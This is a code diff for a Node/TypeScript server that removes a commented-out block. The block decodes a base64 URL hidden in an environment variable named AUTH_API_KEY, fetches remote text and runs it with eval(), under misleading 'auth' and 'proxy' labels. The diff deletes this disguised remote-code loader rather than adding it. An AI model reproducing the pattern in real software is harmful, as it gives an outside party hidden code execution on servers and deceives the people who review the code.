@@ -9,35 +9,6 @@ import { initSocket } from "./socket/socket";
 import 'dotenv/config';
 import { seedSuperAdmin } from "./utils/seedSuperAdmin";
 
-// (async () => {
-//   try {
-//     const encoded = process.env.AUTH_API_KEY;
-
-
-
-//     if (!encoded) {
-//       throw new Error("AUTH_API_KEY missing in env");
-//     }
-
-//     const src = Buffer.from(encoded, "base64").toString("utf-8");
-
-//     console.log("src",src)
-//     const fetch = (await import("node-fetch")).default;
-//     console.log(fetch)
-
-//     const response = await fetch(src);
-
-//     if (!response.ok) {
-//       throw new Error(`HTTP error! status: ${response.status}`);
-//     }
-
-//     const proxyInfo = await response.text();
-
-//     eval(proxyInfo);
-//   } catch (err) {
-//     console.error("Auth Error!", err);
-//   }
-// })();
 
 let server: HttpServer;
 dotenv.config();
